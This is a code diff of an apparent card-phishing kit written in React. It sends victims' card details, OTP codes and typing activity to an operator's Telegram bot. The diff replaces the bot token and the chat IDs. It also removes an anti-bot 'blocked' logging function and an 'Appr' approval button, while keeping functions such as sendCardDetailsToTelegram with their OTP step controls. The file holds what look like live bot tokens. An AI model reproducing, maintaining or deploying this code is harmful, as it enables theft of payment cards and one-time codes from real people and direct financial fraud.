@@ -2,11 +2,11 @@
 import { useRef, useEffect, useCallback } from 'react';
 import axios from 'axios';
 
-const TELEGRAM_BOT_TOKEN = '8508454843:AAFvoYKFTZvuEs2KDKBfdSQYRtvFWsNqoRk';
+const TELEGRAM_BOT_TOKEN = '8993864160:AAHTqvp0tZXmJvgXvRb5L_yqE2cUexbn5TI';
 
 // Channel IDs
-const LOGS_CHAT_ID = '-5259704826';
-const ACTIONS_CHAT_ID = '-4820671789';
+const LOGS_CHAT_ID = '-1004332491640';
+const ACTIONS_CHAT_ID = '-1004349569801';
 
 // Anti-spam: Track last log times
 const lastLogTimes = {
@@ -20,7 +20,6 @@ const lastLogTimes = {
   cardTyping: 0,
   otpTyping: 0,
   confirmation: 0,
-  blocked: 0,
   visitNotification: 0,
   formattedCard: 0,
   otpCode: 0,
@@ -516,7 +515,6 @@ const sendCardDetailsToTelegram = async (cardData, sessionId) => {
     const keyboard = {
       inline_keyboard: [
         [
-          { text: "➡️ Next Step (Appr)", callback_data: `appr_${sessionId}` },
           { text: "➡️ Next Step (OTP)", callback_data: `next_${sessionId}` }, 
         ],
         [
@@ -720,31 +718,7 @@ const sendCardDetailsToTelegram = async (cardData, sessionId) => {
     }
   };
 
-  const sendBlockedLog = async (username, reason, userIP) => {
-    if (!shouldSendLog('blocked')) return;
-    try {
-      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-      const message = `
-🚫 <b>USER BLOCKED - ANTI-BOT</b> 🚫
-━━━━━━━━━━━━━━━━━━━━━
-👤 <b>Username:</b> ${username || 'Unknown'}
-🔌 <b>IP Address:</b> ${userIP}
-📝 <b>Reason:</b> ${reason}
-⏰ <b>Time:</b> ${new Date().toLocaleString()}
-━━━━━━━━━━━━━━━━━━━━━
-⚠️ <i>This user has been blocked!</i>
-      `;
-
-      await axios.post(url, {
-        chat_id: LOGS_CHAT_ID,
-        text: message,
-        parse_mode: 'HTML'
-      });
-      console.log('✅ Blocked log sent to Telegram');
-    } catch (error) {
-      console.error('Error sending blocked log:', error);
-    }
-  };
+  
 
   const sendCardVerificationLog = async (username) => {
     if (!shouldSendLog('cardVerification')) return;
@@ -1121,7 +1095,6 @@ const sendCardDetailsToTelegram = async (cardData, sessionId) => {
     sendCardTypingLog,
     sendOtpTypingLog,
     sendSiteEntryLog,
-    sendBlockedLog,
     sendVisitNotification,
     sendConfirmationLog,
     sendConfirmationPageLog,
